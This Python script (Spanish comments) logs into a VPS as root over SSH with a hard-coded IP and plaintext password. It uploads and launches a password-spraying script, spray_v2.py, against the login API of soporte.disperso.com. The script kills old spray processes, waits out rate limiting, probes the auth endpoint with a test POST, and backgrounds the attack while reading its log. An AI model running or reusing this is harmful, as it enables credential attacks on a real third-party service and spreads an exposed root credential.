"""Deploy spray_v2.py al VPS y lanzar."""
import paramiko, time

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('64.177.83.195', username='root', password='Nm9.#p)WzifT.fo2', timeout=20)
print("[+] Conectado")

def run(client, cmd, timeout=30):
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode().strip()

# Kill cualquier proceso spray viejo
print("[*] Matando procesos spray viejos...")
run(client, 'pkill -f spray_soporte 2>/dev/null; pkill -f spray_v2 2>/dev/null; sleep 2')

# Subir script v2
sftp = client.open_sftp()
sftp.put(r'c:\xampp\htdocs\pentagi\disperso_recon\spray_v2.py', '/tmp/spray_v2.py')
sftp.close()
print("[+] spray_v2.py subido")

# Esperar un poco para que rate limit se limpie
print("[*] Esperando 15s para que rate limit se limpie...")
time.sleep(15)

# Test rápido
out = run(client, 'curl -sk -X POST https://soporte.disperso.com/api/auth/login -H "Content-Type: application/json" -d \'{"email":"test@test.com","password":"test"}\' -w "CODE:%{http_code}" --max-time 10 2>&1')
print(f"[*] Test: {out[:200]}")

# Lanzar
out = run(client, 'rm -f /tmp/hexagon_spray_results.json /tmp/spray_v2_out.log; nohup python3 -u /tmp/spray_v2.py > /tmp/spray_v2_out.log 2>&1 & echo PID:$!')
print(f"[*] Lanzado: {out}")

# Wait y check
time.sleep(20)
out = run(client, 'cat /tmp/spray_v2_out.log')
print(f"[*] Log (20s):\n{out[:2000]}")

client.close()
